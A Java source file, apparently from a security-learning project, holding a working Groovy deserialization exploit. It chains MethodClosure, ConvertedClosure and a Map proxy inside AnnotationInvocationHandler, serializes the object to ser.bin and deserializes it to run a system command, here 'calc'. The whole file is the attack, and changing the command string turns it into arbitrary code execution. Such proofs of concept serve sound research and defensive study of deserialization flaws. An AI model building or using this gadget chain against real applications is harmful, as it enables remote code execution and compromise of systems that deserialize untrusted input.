package org.exploit.third.Groovy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;

public class ConversionHandler {
    public static void main(String[] args) throws Exception
    {
        MethodClosure mc = new MethodClosure("calc","execute");
        ConvertedClosure closure = new ConvertedClosure(mc);
        Object proxyConvertedClosure = Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},closure);//ConversionClosure代理Map
        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annoconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);
        annoconstructor.setAccessible(true);
        Object annotationInvocationHandlerInstance = annoconstructor.newInstance(Target.class,null);
        Field memberValuesField = annotationInvocationHandler.getDeclaredField("memberValues");
        memberValuesField.setAccessible(true);
        memberValuesField.set(annotationInvocationHandlerInstance,proxyConvertedClosure);
        serialize(annotationInvocationHandlerInstance);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
